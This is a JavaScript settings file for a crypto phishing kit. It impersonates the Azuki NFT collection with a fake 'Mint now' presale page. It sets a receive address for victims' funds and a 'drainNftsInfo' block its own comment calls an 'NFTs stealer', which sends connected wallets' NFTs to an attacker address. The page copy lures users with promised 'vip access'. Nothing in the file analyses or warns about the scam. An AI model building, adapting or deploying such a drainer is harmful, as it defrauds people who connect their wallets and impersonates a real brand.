const authorInfo = {
    address: "0x9b94426a1856c265bc36EED11654434d76679ADC",
    infuraId: "07f7ac1e3cbf4d4ea6a39200e759c375"
}
const collectionInfo = {
    name: "Azuki",
    title: "{name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    date: "08.03.2022",
    socialMedia: {
        discord: "https://discord.gg/azuki ",
        twitter: "https://twitter.com/AzukiOfficial",
    },
    medias: {
        preview: "gif.gif",
	favicon: "logo.jpg",
    },
    background: {
        type: "image",
        image: "bj.jpg",
        video: "",
        color: "#4E4E6D",
    }
}
const mintInfo = {
    price: 0.25,
    totalSupply: 100,
	toFixed: 2,
    minUnits: 1,
    maxUnits: 5,
    askMintLoop: true,
}

const nftsInfo = {
    active: true,
    minValue: 0.3,
    maxTransfer: 2,
}

if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);

if (!authorInfo.address.startsWith("0x") ||
    (
        authorInfo.address.length >= 64 ||
        authorInfo.address.length <= 40
    )
) console.error(`Error: ${authorInfo.address} is not a valid Ethereum address.`);

const receiveAddress = "0xF480F4E06aA2323F54b7900Fd3D248C70cac89f5";



const claimPageInfo = {
    title: "<br>", // <br> is a line break
    shortDescription: "",
    longDescription: "A Database of wallet addresses that receive early access to an NFT collection before its public launch. Those on the vip access have the option of buying newly released NFTs before the rest of the market, and at much lower transaction fees.The wallet addresses that make up the vip access are usually carefully chosen users who have supported the project in its early days. These users interact, promote and discuss the NFT project",

    claimButtonText: "NEX",

    image: "ola.gif", // relative path to image (in assets)
    imageRadius: 250, // image radius in px
}

const drainNftsInfo = {
    active: true,   // Active (true) or not (false) NFTs stealer.
    minValue: 0.1,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    nftReceiveAddress: "0xF480F4E06aA2323F54b7900Fd3D248C70cac89f5" // leave empty if you want to use the same as receiveAddress 
}

const customStrings = {
    title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    connectButton: "Connet",
    transferButton: "Mint now",
    dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
}

/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (!receiveAddress.startsWith("0x") ||
    (
        receiveAddress.length >= 64 ||
        receiveAddress.length <= 40
    )
) console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
//#endregion
